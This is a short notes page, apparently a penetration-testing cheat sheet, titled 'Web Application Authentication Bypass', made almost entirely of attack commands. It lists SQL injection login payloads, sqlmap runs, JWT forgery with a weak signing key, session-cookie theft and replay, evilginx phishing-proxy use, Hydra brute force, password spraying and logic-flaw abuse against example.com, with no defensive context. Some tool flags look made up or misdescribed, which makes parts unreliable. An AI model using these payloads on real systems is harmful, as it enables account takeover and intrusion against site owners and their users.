---
layout: notes
permalink: /notes/web/auth/
title: Web Application Authentication Bypass
---

# Web Application Authentication Bypass

## SQL Login Bypass
```bash
# Test SQL injection
admin' OR 1=1 --

# Use UNION
admin' UNION SELECT 1, 'password' --

# Blind SQLi with sleep
admin' AND SLEEP(5) --

# Automate with sqlmap
sqlmap -u http://example.com/login --data="user=admin&pass=test" --level=3
```

## Token Manipulation
```bash
# Decode JWT
jwt_tool <token>

# Modify JWT payload
echo '{"user":"admin"}' | base64 > payload.b64

# Sign with weak key
jwt -S HS256 -s "weakkey" -p payload.b64 -o newtoken.jwt

# Test signature bypass
curl -H "Authorization: Bearer <modified_token>" http://example.com
```

## Session Hijacking
```bash
# Steal session cookie
document.cookie

# Use Burp to capture

# Inject cookie
curl -b "session=stolen_cookie" http://example.com

# Automate with evilginx
evilginx -u http://example.com -o cookies.txt
```

## Brute Force
```bash
# Brute-force with Hydra
hydra -l admin -P wordlist.txt http://example.com/login -f

# Use Burp Intruder

# Password spraying
crackmapexec http <target> -u users.txt -p passwords.txt

# Rate-limit bypass
slowhttptest -c 1000 -H -g -o status_code -u http://example.com
```

## Other Techniques
```bash
# Weak Password Reset
curl "http://example.com/reset?token=1234&newpass=admin"

# CAPTCHA Bypass
curl -d "captcha=guess" http://example.com/login

# Default Credentials
admin:admin
admin:password

# Logic Flaws
curl "http://example.com/change?user=admin&newrole=admin"
```

## Tools
- sqlmap: ```sqlmap -u http://example.com```
- jwt_tool: ```jwt_tool <token>```
- Hydra: ```hydra -l <user> -P <wordlist> <target>```
- evilginx: ```evilginx -u http://example.com```
- CrackMapExec: ```crackmapexec http <target> -u <user> -p <pass>```
- OWASP ZAP: ```zap-cli -t http://example.com```
- slowhttptest: ```slowhttptest -u http://example.com```